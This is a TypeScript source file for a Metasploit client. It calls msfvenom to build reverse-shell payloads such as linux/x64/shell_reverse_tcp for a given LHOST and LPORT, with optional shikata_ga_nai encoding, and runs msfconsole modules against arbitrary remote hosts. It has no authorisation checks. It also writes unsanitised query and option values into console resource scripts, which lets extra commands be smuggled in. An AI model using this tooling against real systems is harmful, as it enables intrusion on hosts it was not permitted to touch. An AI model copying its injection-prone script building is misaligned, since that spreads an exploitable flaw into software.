/**
 * Metasploit Framework RPC Client & Payload Generator
 * Integrates with msfconsole / msfvenom via execFile and optional MSGRPC socket.
 */

import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import * as fs from 'node:fs'
import * as crypto from 'node:crypto'

const execFileP = promisify(execFile)

function rand() { return crypto.randomBytes(4).toString('hex') }

export interface MsfPayloadOpts {
  payload: string       // e.g. "linux/x64/shell_reverse_tcp"
  lhost: string
  lport: number
  format?: string       // "elf", "exe", "raw", "c", "python"
  encoder?: string      // "x86/shikata_ga_nai"
  iterations?: number
}

export interface MsfSearchResult {
  name: string
  type: string
  disclosureDate: string
  rank: string
  description: string
}

export class MetasploitClient {
  async generatePayload(opts: MsfPayloadOpts): Promise<{ success: boolean; filePath?: string; rawBytes?: Buffer; error?: string }> {
    const format = opts.format || 'raw'
    const outFile = `/tmp/msf_${rand()}.${format === 'elf' ? 'elf' : format === 'exe' ? 'exe' : 'bin'}`
    try {
      const args = [
        '-p', opts.payload,
        `LHOST=${opts.lhost}`,
        `LPORT=${opts.lport}`,
        '-f', format,
        '-o', outFile,
      ]
      if (opts.encoder) args.push('-e', opts.encoder)
      if (opts.iterations) args.push('-i', String(opts.iterations))
      await execFileP('msfvenom', args, { timeout: 60000 })
      const bytes = fs.readFileSync(outFile)
      return { success: true, filePath: outFile, rawBytes: bytes }
    } catch (e) {
      return { success: false, error: String((e as Error).message || e) }
    }
  }

  async searchModules(query: string): Promise<MsfSearchResult[]> {
    const results: MsfSearchResult[] = []
    try {
      // Run msfconsole in quiet mode to search
      const scriptFile = `/tmp/msf_search_${rand()}.rc`
      fs.writeFileSync(scriptFile, `search ${query}\nexit\n`)
      const res = await execFileP('msfconsole', ['-q', '-r', scriptFile], { timeout: 30000 }).catch((e: unknown) => ({ stdout: (e as {stdout?: string}).stdout || '' }))
      fs.unlinkSync(scriptFile)
      const lines = res.stdout.split('\n')
      for (const line of lines) {
        if (line.includes('exploit/') || line.includes('auxiliary/') || line.includes('post/')) {
          const parts = line.split(/\s{2,}/).filter(Boolean)
          if (parts.length >= 3) {
            results.push({
              name: parts[1] || parts[0],
              type: parts[0].split('/')[0] || 'exploit',
              disclosureDate: parts[2] || '',
              rank: parts[3] || 'normal',
              description: parts[4] || '',
            })
          }
        }
      }
    } catch { /* ignore */ }
    return results
  }

  async runAuxiliaryScan(moduleName: string, rhosts: string, options: Record<string, string> = {}): Promise<string> {
    const scriptFile = `/tmp/msf_aux_${rand()}.rc`
    let script = `use ${moduleName}\nset RHOSTS ${rhosts}\n`
    for (const [k, v] of Object.entries(options)) {
      script += `set ${k} ${v}\n`
    }
    script += `run\nexit\n`
    fs.writeFileSync(scriptFile, script)
    try {
      const res = await execFileP('msfconsole', ['-q', '-r', scriptFile], { timeout: 120000 })
      return res.stdout
    } catch (e) {
      return String((e as Error).message || e)
    } finally {
      try { fs.unlinkSync(scriptFile) } catch { /* ignore */ }
    }
  }
}
